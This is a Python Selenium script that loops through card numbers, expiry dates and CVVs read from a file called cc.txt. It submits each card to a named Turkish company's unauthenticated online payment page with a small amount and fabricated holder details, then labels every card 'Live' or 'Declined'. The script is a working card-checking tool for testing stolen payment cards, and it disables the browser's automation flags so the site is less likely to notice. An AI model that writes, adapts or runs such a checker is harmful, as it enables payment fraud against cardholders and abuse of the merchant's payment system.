import chromedriver_autoinstaller
from http import client
from typing import Text
from selenium import webdriver
from colorama import Fore, Back, Style, init
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.support import select
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.ui import Select
import random
import re
import string
from time import sleep



def funct():
    CCList = open('cc.txt', "r+", encoding="utf8").read().splitlines()
    kartlar = []

    for i in CCList:
        bolum = i.split('|')
        kartlar.append((bolum[0], bolum[1], bolum[2], bolum[3]) ,)

    return kartlar


letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
           "o", "p","q", "r","s", "t","u", "v","w", "x","y", "z",]
def random_char(char_num):
       return ''.join(random.choice(string.ascii_letters) for _ in range(char_num))

options = webdriver.ChromeOptions()

options.add_experimental_option("useAutomationExtension", False)  # Adding Argument to Not Use Automation Extension
options.add_experimental_option("excludeSwitches", ["enable-automation"])  # Excluding enable-automation Switch
options.add_argument("disable-popup-blocking")
options.add_argument("disable-notifications")
options.add_argument("disable-gpu")
#options.add_argument("user-data-dir=/home/kali/Masaüstü/Card-Tweaker-main/")
#driver = webdriver.Chrome(executable_path="/home/kali/Masaüstü/Card-Tweaker-main/chromedriver",options=options)
chromedriver_autoinstaller.install()
driver = webdriver.Chrome(options=options)
driver.set_window_size(230, 550)
user_agent =" Mozilla/5.1 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1"
wait = WebDriverWait(driver, 26, poll_frequency=1)
print('Starting ..')
driver.delete_all_cookies()

init(autoreset=True)
while True:
        buy = ("https://odeme.mobiliz.com.tr/Payment/UnAuthenticatedPayment?notAut=True")
        print('Starting ..')
        driver.get(buy)
        sleep(2)
        kartlar = funct()
        for (cc, mm, yy, cvv) in kartlar:
         s = cc
         o = []
         while s:
          o.append(s[:4])
          s = s[4:]
          
         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="paymentItem"]/button[2]'))).click()
         sleep(0.3)
         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="paymentItem"]/ul/li/div'))).click()
         
         wait.until(EC.presence_of_element_located((By.ID, 'PureAmount'))).click()
         sleep(1)
         wait.until(EC.presence_of_element_located((By.ID, 'PureAmount'))).send_keys('20')
         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[3]/tbody/tr[2]/td[4]/input'))).click()
         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[3]/tbody/tr[2]/td[4]/input'))).click()
         #wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#installmentTable > table > tbody > tr:nth-child(2) > td.commRate-20.best-commrate.highlight > input'))).click()
         wait.until(EC.presence_of_element_located((By.ID, 'Phone'))).click()
         wait.until(EC.presence_of_element_located((By.ID, 'Phone'))).send_keys('545621589')
         wait.until(EC.presence_of_element_located((By.ID, 'CardHolderName'))).send_keys('selim kurrt')
         wait.until(EC.presence_of_element_located((By.ID, 'Email'))).send_keys('se54@nart.com')
        # wait.until(EC.presence_of_element_located((By.ID, 'TransactionDescription'))).send_keys('seggcom')
        # sleep(0.2)
        # try:
        #     wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#installmentTable > table > tbody > tr:nth-child(2) > td.commRate-20.best-commrate.highlight > input'))).click()
        #     print("pos secildi")
        # except ValueError:
        #     print("pos tiklanamadi")
         wait.until(EC.presence_of_element_located((By.ID, 'CardNumber'))).send_keys(o[0])
         wait.until(EC.presence_of_element_located((By.ID, 'CardNumber'))).send_keys(o[1])
         wait.until(EC.presence_of_element_located((By.ID, 'CardNumber'))).send_keys(o[2])
         wait.until(EC.presence_of_element_located((By.ID, 'CardNumber'))).send_keys(o[3])
         wait.until(EC.presence_of_element_located((By.ID, 'CardExpireDate'))).send_keys(mm)
         wait.until(EC.presence_of_element_located((By.ID, 'CardExpireDate'))).send_keys(yy)
         wait.until(EC.presence_of_element_located((By.ID, 'CardCvv'))).click()
         wait.until(EC.presence_of_element_located((By.ID, 'CardCvv'))).send_keys(Keys.CONTROL + Keys.BACKSPACE)
         wait.until(EC.presence_of_element_located((By.ID, 'CardCvv'))).send_keys(cvv)
         wait.until(EC.presence_of_element_located((By.ID, 'btnNormalPayment'))).click()
         sleep(3.5)
 
         if 'Lütfen taksit seçeneklerinden birini seçiniz.' in driver.page_source:
             wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[3]/tbody/tr[2]/td[4]/input'))).click()
             print(Fore.GREEN +'5.00 TL WORLD POS SECİLDİ')
             wait.until(EC.presence_of_element_located((By.ID, 'btnNormalPayment'))).click()
             sleep(2)
 
         elif 'İşleminiz Tamamlandı.' in driver.page_source:
             print(Fore.GREEN + "                                           ")
             print(Fore.GREEN + "                                          ")
             print(Fore.GREEN + "                                            ")
             print(Fore.GREEN + "                                            ")
             print(Fore.GREEN + driver.find_element(By.XPATH, "//*[@id='myForm']/div[2]/div/div[1]/p").text)
             print(Fore.GREEN + "                                            ")
             print(Fore.GREEN + "Live: " , cc,"|",mm,"|",yy,"|",cvv,)
             print(Fore.GREEN + "                                            ")
             print(Fore.GREEN + "                                            ")
             print(Fore.GREEN +"Yes - No ")
             choice = input(Fore.RED +"Devam ?" )
             if choice == 'y':
                 print(Fore.GREEN +"devam ediyor .")
                 sleep(0.2)
                 print(Fore.GREEN +"devam ediyor ..")
                 driver.get("https://odeme.mobiliz.com.tr/Payment/UnAuthenticatedPayment?notAut=True")
                 sleep(2)
             else:
                 print(Fore.GREEN + "                                 ")
                 print("Program Kapatılıyor.")
                 sleep(0.2)
                 exit()
         elif "Ödenecek tutar 0'dan büyük olmalıdır." in driver.page_source:
             wait.until(EC.presence_of_element_located((By.ID, 'PureAmount'))).send_keys('5')
             sleep(0.2)
             wait.until(EC.presence_of_element_located((By.ID, 'btnNormalPayment'))).click()
             sleep(2)
         else:
             print(Fore.RED +"Declined :Ödeme Yapılamadı.", cc,"|",mm,"|",yy,"|",cvv,)     
             driver.get("https://odeme.mobiliz.com.tr/Payment/UnAuthenticatedPayment?notAut=True")
             sleep(3)
         sleep(3)    
